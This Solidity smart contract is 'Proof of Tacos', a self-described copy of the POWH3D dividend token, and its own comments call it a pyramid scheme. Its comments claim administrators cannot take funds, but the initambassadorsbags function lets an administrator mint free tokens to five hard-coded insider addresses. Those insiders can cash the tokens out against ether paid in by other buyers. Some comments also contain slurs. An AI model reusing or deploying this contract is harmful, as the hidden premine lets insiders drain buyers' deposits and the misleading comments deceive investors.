1 pragma solidity ^0.4.20;
2 
3 /*
4 * 
5 * ====================================*
6 *   _________  ________  ________  ________  ________      
7 *  |\___   ___\\   __  \|\   ____\|\   __  \|\   ____\     
8 *  \|___ \  \_\ \  \|\  \ \  \___|\ \  \|\  \ \  \___|_    
9 *       \ \  \ \ \   __  \ \  \    \ \  \\\  \ \_____  \   
10 *        \ \  \ \ \  \ \  \ \  \____\ \  \\\  \|____|\  \  
11 *         \ \__\ \ \__\ \__\ \_______\ \_______\____\_\  \ 
12 *          \|__|  \|__|\|__|\|_______|\|_______|\_________\
13 *                                              \|_________|                                                       
14 * ====================================*
15 * -> What?
16 * This source code is copy of Proof of Weak Hands (POWH3D)
17 * If POWL can do it, shit, why can't we do it with TACOS, we all LOVE TACOS, isn't?
18 */
19 
20 contract TACOS {
21     /*=================================
22     =            MODIFIERS            =
23     =================================*/
24     // only people with tokens
25     modifier onlyBagholders() {
26         require(myTokens() > 0);
27         _;
28     }
29     
30     // only people with profits
31     modifier onlyStronghands() {
32         require(myDividends(true) > 0);
33         _;
34     }
35     
36     // administrators can:
37     // -> change the name of the contract
38     // -> change the name of the token
39     // -> change the PoS difficulty (How many tokens it costs to hold a masternode, in case it gets crazy high later)
40     // they CANNOT:
41     // -> take funds
42     // -> disable withdrawals
43     // -> kill the contract
44     // -> change the price of tokens
45     modifier onlyAdministrator(){
46         address _customerAddress = msg.sender;
47         require(administrators[keccak256(_customerAddress)]);
48         _;
49     }
50     
51     
52     // ensures that the first tokens in the contract will be equally distributed
53     // meaning, no divine dump will be ever possible
54     // result: healthy longevity.
55     modifier antiEarlyWhale(uint256 _amountOfEthereum){
56         address _customerAddress = msg.sender;
57         
58         // are we still in the vulnerable phase?
59         // if so, enact anti early whale protocol 
60         if( onlyAmbassadors && ((totalEthereumBalance() - _amountOfEthereum) <= ambassadorQuota_ )){
61             require(
62                 // is the customer in the ambassador list?
63                 ambassadors_[_customerAddress] == true &&
64                 
65                 // does the customer purchase exceed the max ambassador quota?
66                 (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfEthereum) <= ambassadorMaxPurchase_
67                 
68             );
69             
70             // updated the accumulated quota    
71             ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfEthereum);
72         
73             // execute
74             _;
75         } else {
76             // in case the ether count drops low, the ambassador phase won't reinitiate
77             onlyAmbassadors = false;
78             _;    
79         }
80         
81     }
82     
83     
84     /*==============================
85     =            EVENTS            =
86     ==============================*/
87     event onTokenPurchase(
88         address indexed customerAddress,
89         uint256 incomingEthereum,
90         uint256 tokensMinted,
91         address indexed referredBy
92     );
93     
94     event onTokenSell(
95         address indexed customerAddress,
96         uint256 tokensBurned,
97         uint256 ethereumEarned
98     );
99     
100     event onReinvestment(
101         address indexed customerAddress,
102         uint256 ethereumReinvested,
103         uint256 tokensMinted
104     );
105     
106     event onWithdraw(
107         address indexed customerAddress,
108         uint256 ethereumWithdrawn
109     );
110     
111     // ERC20
112     event Transfer(
113         address indexed from,
114         address indexed to,
115         uint256 tokens
116     );
117     
118     
119     /*=====================================
120     =            CONFIGURABLES            =
121     =====================================*/
122     string public name = "Proof of Tacos";
123     string public symbol = "TACOS";
124     uint8 constant public decimals = 18;
125     uint8 constant internal dividendFee_ = 10;
126     uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;
127     uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;
128     uint256 constant internal magnitude = 2**64;
129     
130     // proof of stake (defaults at 100 tokens)
131     uint256 public stakingRequirement = 5e18;
132     
133     // ambassador program
134     mapping(address => bool) internal ambassadors_;
135     uint256 constant internal ambassadorMaxPurchase_ = 2 ether;
136     uint256 constant internal ambassadorQuota_ = 10 ether;
137     bool public initambassadors_ = false;
138     
139     
140     
141    /*================================
142     =            DATASETS            =
143     ================================*/
144     // amount of shares for each address (scaled number)
145     mapping(address => uint256) internal tokenBalanceLedger_;
146     mapping(address => uint256) internal referralBalance_;
147     mapping(address => int256) internal payoutsTo_;
148     mapping(address => uint256) internal ambassadorAccumulatedQuota_;
149     uint256 internal tokenSupply_ = 0;
150     uint256 internal profitPerShare_;
151     
152     // administrator list (see above on what they can do)
153     mapping(bytes32 => bool) public administrators;
154     
155     // when this is set to true, only ambassadors can purchase tokens (this prevents a whale premine, it ensures a fairly distributed upper pyramid)
156     bool public onlyAmbassadors;
157     
158 
159 
160     /*=======================================
161     =            PUBLIC FUNCTIONS            =
162     =======================================*/
163     /*
164     * -- APPLICATION ENTRY POINTS --  
165     */
166     function TACOS()
167         public
168     {
169         // init onlyAmbassadors in constructor, more efficient
170         onlyAmbassadors = false;
171         
172         // add administrators here
173         // this guy is serious... take that into account
174         administrators[0xfd4232e797f085d1f9cc365548584188d2a39dabb9f90d93ba0347f33ff431a6] = true; //AH
175 
176         // add the ambassadors here. 
177         ambassadors_[0x9d59502254005a5B03037ba992270D34A5571577] = true; //AH
178         ambassadors_[0xb7B5C10a4FB2B0dda8E890bD9b818188844C17Cd] = true; //CS
179         ambassadors_[0x9C492E9ef76fd866FF634f6ee118Ec76AEF4A4B0] = true; //LC
180         ambassadors_[0x5aA8Bbe4c41536C3953a8A9350c542C39Fb72216] = true; //DH
181         ambassadors_[0x1d6BBF6F52AB037b019d8079eB5586521eb8543D] = true; //BS
182         
183     }
184     
185      
186     /**
187      * Converts all incoming ethereum to tokens for the caller, and passes down the referral addy (if any)
188      */
189     function buy(address _referredBy)
190         public
191         payable
192         returns(uint256)
193     {
194         purchaseTokens(msg.value, _referredBy);
195     }
196     
197     /**
198      * Fallback function to handle ethereum that was send straight to the contract
199      * Unfortunately we cannot use a referral address this way.
200      */
201     function()
202         payable
203         public
204     {
205         purchaseTokens(msg.value, 0x0);
206     }
207     
208     /**
209      * Converts all of caller's dividends to tokens.
210      */
211     function reinvest()
212         onlyStronghands()
213         public
214     {
215         // fetch dividends
216         uint256 _dividends = myDividends(false); // retrieve ref. bonus later in the code
217         
218         // pay out the dividends virtually
219         address _customerAddress = msg.sender;
220         payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
221         
222         // retrieve ref. bonus
223         _dividends += referralBalance_[_customerAddress];
224         referralBalance_[_customerAddress] = 0;
225         
226         // dispatch a buy order with the virtualized "withdrawn dividends"
227         uint256 _tokens = purchaseTokens(_dividends, 0x0);
228         
229         // fire event
230         onReinvestment(_customerAddress, _dividends, _tokens);
231     }
232     
233     /**
234      * Alias of sell() and withdraw().
235      */
236     function exit()
237         public
238     {
239         // get token count for caller & sell them all
240         address _customerAddress = msg.sender;
241         uint256 _tokens = tokenBalanceLedger_[_customerAddress];
242         if(_tokens > 0) sell(_tokens);
243         
244         // lambo delivery service
245         withdraw();
246     }
247 
248     /**
249      * Withdraws all of the callers earnings.
250      */
251     function withdraw()
252         onlyStronghands()
253         public
254     {
255         // setup data
256         address _customerAddress = msg.sender;
257         uint256 _dividends = myDividends(false); // get ref. bonus later in the code
258         
259         // update dividend tracker
260         payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
261         
262         // add ref. bonus
263         _dividends += referralBalance_[_customerAddress];
264         referralBalance_[_customerAddress] = 0;
265         
266         // your lambo is ready to pick up
267         _customerAddress.transfer(_dividends);
268         
269         // fire event
270         onWithdraw(_customerAddress, _dividends);
271     }
272     
273     /**
274      * Liquifies tokens to ethereum.
275      */
276     function sell(uint256 _amountOfTokens)
277         onlyBagholders()
278         public
279     {
280         // setup data
281         address _customerAddress = msg.sender;
282         // russian hackers BTFO
283         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
284         uint256 _tokens = _amountOfTokens;
285         uint256 _ethereum = tokensToEthereum_(_tokens);
286         uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);
287         uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
288         
289         // burn the sold tokens
290         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
291         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
292         
293         // update dividends tracker
294         int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
295         payoutsTo_[_customerAddress] -= _updatedPayouts;       
296         
297         // dividing by zero is a bad idea
298         if (tokenSupply_ > 0) {
299             // update the amount of dividends per token
300             profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
301         }
302         
303         // fire event
304         onTokenSell(_customerAddress, _tokens, _taxedEthereum);
305     }
306     
307     
308     /**
309      * Transfer tokens from the caller to a new holder.
310      * Remember, there's a 10% fee here as well.
311      */
312     function transfer(address _toAddress, uint256 _amountOfTokens)
313         onlyBagholders()
314         public
315         returns(bool)
316     {
317         // setup
318         address _customerAddress = msg.sender;
319         
320         // make sure we have the requested tokens
321         // also disables transfers until ambassador phase is over
322         // ( we dont want whale premines )
323         require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
324         
325         // withdraw all outstanding dividends first
326         if(myDividends(true) > 0) withdraw();
327         
328         // liquify 10% of the tokens that are transfered
329         // these are dispersed to shareholders
330         uint256 _tokenFee = SafeMath.div(_amountOfTokens, dividendFee_);
331         uint256 _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);
332         uint256 _dividends = tokensToEthereum_(_tokenFee);
333   
334         // burn the fee tokens
335         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);
336 
337         // exchange tokens
338         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
339         tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
340         
341         // update dividend trackers
342         payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);
343         payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _taxedTokens);
344         
345         // disperse dividends among holders
346         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
347         
348         // fire event
349         Transfer(_customerAddress, _toAddress, _taxedTokens);
350         
351         // ERC20
352         return true;
353        
354     }
355     
356     /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
357     /**
358      * In case the ambassador quota is not met, the administrator can manually disable the ambassador phase.
359      */
360     function disableInitialStage()
361         onlyAdministrator()
362         public
363     {
364         onlyAmbassadors = false;
365     }
366     
367     /**
368      * In case one of us dies, we need to replace ourselves.
369      */
370     function setAdministrator(bytes32 _identifier, bool _status)
371         onlyAdministrator()
372         public
373     {
374         administrators[_identifier] = _status;
375     }
376 
377     function initambassadorsbags()
378         onlyAdministrator()
379         public
380     {
381         // this ensures init can only be called just one time, ever!
382         require (initambassadors_ == false);
383         
384         uint256 _initamountOfTokens = ethereumToTokens_(2 ether);
385         tokenBalanceLedger_[0x9d59502254005a5B03037ba992270D34A5571577] = SafeMath.add(tokenBalanceLedger_[0x9d59502254005a5B03037ba992270D34A5571577], _initamountOfTokens);
386         tokenBalanceLedger_[0xb7B5C10a4FB2B0dda8E890bD9b818188844C17Cd] = SafeMath.add(tokenBalanceLedger_[0xb7B5C10a4FB2B0dda8E890bD9b818188844C17Cd], _initamountOfTokens);
387         tokenBalanceLedger_[0x9C492E9ef76fd866FF634f6ee118Ec76AEF4A4B0] = SafeMath.add(tokenBalanceLedger_[0x9C492E9ef76fd866FF634f6ee118Ec76AEF4A4B0], _initamountOfTokens);
388         tokenBalanceLedger_[0x5aA8Bbe4c41536C3953a8A9350c542C39Fb72216] = SafeMath.add(tokenBalanceLedger_[0x5aA8Bbe4c41536C3953a8A9350c542C39Fb72216], _initamountOfTokens);
389         tokenBalanceLedger_[0x1d6BBF6F52AB037b019d8079eB5586521eb8543D] = SafeMath.add(tokenBalanceLedger_[0x1d6BBF6F52AB037b019d8079eB5586521eb8543D], _initamountOfTokens);
390         tokenSupply_ = SafeMath.mul(_initamountOfTokens, 5);
391 
392         // After this, this variable will never be false again. Thus, we can only call this function once.
393         initambassadors_ = true;
394     }
395     
396     /**
397      * Precautionary measures in case we need to adjust the masternode rate.
398      */
399     function setStakingRequirement(uint256 _amountOfTokens)
400         onlyAdministrator()
401         public
402     {
403         stakingRequirement = _amountOfTokens;
404     }
405     
406     /**
407      * If we want to rebrand, we can.
408      */
409     function setName(string _name)
410         onlyAdministrator()
411         public
412     {
413         name = _name;
414     }
415     
416     /**
417      * If we want to rebrand, we can.
418      */
419     function setSymbol(string _symbol)
420         onlyAdministrator()
421         public
422     {
423         symbol = _symbol;
424     }
425 
426     
427     /*----------  HELPERS AND CALCULATORS  ----------*/
428     /**
429      * Method to view the current Ethereum stored in the contract
430      * Example: totalEthereumBalance()
431      */
432     function totalEthereumBalance()
433         public
434         view
435         returns(uint)
436     {
437         return address (this).balance;
438     }
439     
440     /**
441      * Retrieve the total token supply.
442      */
443     function totalSupply()
444         public
445         view
446         returns(uint256)
447     {
448         return tokenSupply_;
449     }
450     
451     /**
452      * Retrieve the tokens owned by the caller.
453      */
454     function myTokens()
455         public
456         view
457         returns(uint256)
458     {
459         address _customerAddress = msg.sender;
460         return balanceOf(_customerAddress);
461     }
462     
463     /**
464      * Retrieve the dividends owned by the caller.
465      * If `_includeReferralBonus` is to to 1/true, the referral bonus will be included in the calculations.
466      * The reason for this, is that in the frontend, we will want to get the total divs (global + ref)
467      * But in the internal calculations, we want them separate. 
468      */ 
469     function myDividends(bool _includeReferralBonus) 
470         public 
471         view 
472         returns(uint256)
473     {
474         address _customerAddress = msg.sender;
475         return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
476     }
477     
478     /**
479      * Retrieve the token balance of any single address.
480      */
481     function balanceOf(address _customerAddress)
482         view
483         public
484         returns(uint256)
485     {
486         return tokenBalanceLedger_[_customerAddress];
487     }
488     
489     /**
490      * Retrieve the dividend balance of any single address.
491      */
492     function dividendsOf(address _customerAddress)
493         view
494         public
495         returns(uint256)
496     {
497         return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
498     }
499     
500     /**
501      * Return the buy price of 1 individual token.
502      */
503     function sellPrice() 
504         public 
505         view 
506         returns(uint256)
507     {
508         // our calculation relies on the token supply, so we need supply. Doh.
509         if(tokenSupply_ == 0){
510             return tokenPriceInitial_ - tokenPriceIncremental_;
511         } else {
512             uint256 _ethereum = tokensToEthereum_(1e18);
513             uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );
514             uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
515             return _taxedEthereum;
516         }
517     }
518     
519     /**
520      * Return the sell price of 1 individual token.
521      */
522     function buyPrice() 
523         public 
524         view 
525         returns(uint256)
526     {
527         // our calculation relies on the token supply, so we need supply. Doh.
528         if(tokenSupply_ == 0){
529             return tokenPriceInitial_ + tokenPriceIncremental_;
530         } else {
531             uint256 _ethereum = tokensToEthereum_(1e18);
532             uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );
533             uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);
534             return _taxedEthereum;
535         }
536     }
537     
538     /**
539      * Function for the frontend to dynamically retrieve the price scaling of buy orders.
540      */
541     function calculateTokensReceived(uint256 _ethereumToSpend) 
542         public 
543         view 
544         returns(uint256)
545     {
546         uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);
547         uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
548         uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
549         
550         return _amountOfTokens;
551     }
552     
553     /**
554      * Function for the frontend to dynamically retrieve the price scaling of sell orders.
555      */
556     function calculateEthereumReceived(uint256 _tokensToSell) 
557         public 
558         view 
559         returns(uint256)
560     {
561         require(_tokensToSell <= tokenSupply_);
562         uint256 _ethereum = tokensToEthereum_(_tokensToSell);
563         uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);
564         uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
565         return _taxedEthereum;
566     }
567     
568     
569     /*==========================================
570     =            INTERNAL FUNCTIONS            =
571     ==========================================*/
572     function purchaseTokens(uint256 _incomingEthereum, address _referredBy)
573         antiEarlyWhale(_incomingEthereum)
574         internal
575         returns(uint256)
576     {
577         // data setup
578         address _customerAddress = msg.sender;
579         uint256 _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);
580         uint256 _referralBonus = SafeMath.div(_undividedDividends, 3);
581         uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
582         uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);
583         uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);
584         uint256 _fee = _dividends * magnitude;
585  
586         // no point in continuing execution if OP is a poorfag russian hacker
587         // prevents overflow in the case that the pyramid somehow magically starts being used by everyone in the world
588         // (or hackers)
589         // and yes we know that the safemath function automatically rules out the "greater then" equasion.
590         require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
591         
592         // is the user referred by a masternode?
593         if(
594             // is this a referred purchase?
595             _referredBy != 0x0000000000000000000000000000000000000000 &&
596 
597             // no cheating!
598             _referredBy != _customerAddress &&
599             
600             // does the referrer have at least X whole tokens?
601             // i.e is the referrer a godly chad masternode
602             tokenBalanceLedger_[_referredBy] >= stakingRequirement
603         ){
604             // wealth redistribution
605             referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
606         } else {
607             // no ref purchase
608             // add the referral bonus back to the global dividends cake
609             _dividends = SafeMath.add(_dividends, _referralBonus);
610             _fee = _dividends * magnitude;
611         }
612         
613         // we can't give people infinite ethereum
614         if(tokenSupply_ > 0){
615             
616             // add tokens to the pool
617             tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
618  
619             // take the amount of dividends gained through this transaction, and allocates them evenly to each shareholder
620             profitPerShare_ += (_dividends * magnitude / (tokenSupply_));
621             
622             // calculate the amount of tokens the customer receives over his purchase 
623             _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));
624         
625         } else {
626             // add tokens to the pool
627             tokenSupply_ = _amountOfTokens;
628         }
629         
630         // update circulating supply & the ledger address for the customer
631         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
632         
633         // Tells the contract that the buyer doesn't deserve dividends for the tokens before they owned them;
634         //really i know you think you do but you don't
635         int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);
636         payoutsTo_[_customerAddress] += _updatedPayouts;
637         
638         // fire event
639         onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);
640         
641         return _amountOfTokens;
642     }
643 
644     /**
645      * Calculate Token price based on an amount of incoming ethereum
646      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
647      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
648      */
649     function ethereumToTokens_(uint256 _ethereum)
650         internal
651         view
652         returns(uint256)
653     {
654         uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;
655         uint256 _tokensReceived = 
656          (
657             (
658                 // underflow attempts BTFO
659                 SafeMath.sub(
660                     (sqrt
661                         (
662                             (_tokenPriceInitial**2)
663                             +
664                             (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
665                             +
666                             (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
667                             +
668                             (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
669                         )
670                     ), _tokenPriceInitial
671                 )
672             )/(tokenPriceIncremental_)
673         )-(tokenSupply_)
674         ;
675   
676         return _tokensReceived;
677     }
678     
679     /**
680      * Calculate token sell value.
681      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
682      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
683      */
684      function tokensToEthereum_(uint256 _tokens)
685         internal
686         view
687         returns(uint256)
688     {
689 
690         uint256 tokens_ = (_tokens + 1e18);
691         uint256 _tokenSupply = (tokenSupply_ + 1e18);
692         uint256 _etherReceived =
693         (
694             // underflow attempts BTFO
695             SafeMath.sub(
696                 (
697                     (
698                         (
699                             tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
700                         )-tokenPriceIncremental_
701                     )*(tokens_ - 1e18)
702                 ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
703             )
704         /1e18);
705         return _etherReceived;
706     }
707     
708     
709     //This is where all your gas goes, sorry
710     //Not sorry, you probably only paid 1 gwei
711     function sqrt(uint x) internal pure returns (uint y) {
712         uint z = (x + 1) / 2;
713         y = x;
714         while (z < y) {
715             y = z;
716             z = (x / z + z) / 2;
717         }
718     }
719 }
720 
721 /**
722  * @title SafeMath
723  * @dev Math operations with safety checks that throw on error
724  */
725 library SafeMath {
726 
727     /**
728     * @dev Multiplies two numbers, throws on overflow.
729     */
730     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
731         if (a == 0) {
732             return 0;
733         }
734         uint256 c = a * b;
735         assert(c / a == b);
736         return c;
737     }
738 
739     /**
740     * @dev Integer division of two numbers, truncating the quotient.
741     */
742     function div(uint256 a, uint256 b) internal pure returns (uint256) {
743         // assert(b > 0); // Solidity automatically throws when dividing by 0
744         uint256 c = a / b;
745         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
746         return c;
747     }
748 
749     /**
750     * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
751     */
752     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
753         assert(b <= a);
754         return a - b;
755     }
756 
757     /**
758     * @dev Adds two numbers, throws on overflow.
759     */
760     function add(uint256 a, uint256 b) internal pure returns (uint256) {
761         uint256 c = a + b;
762         assert(c >= a);
763         return c;
764     }
765 }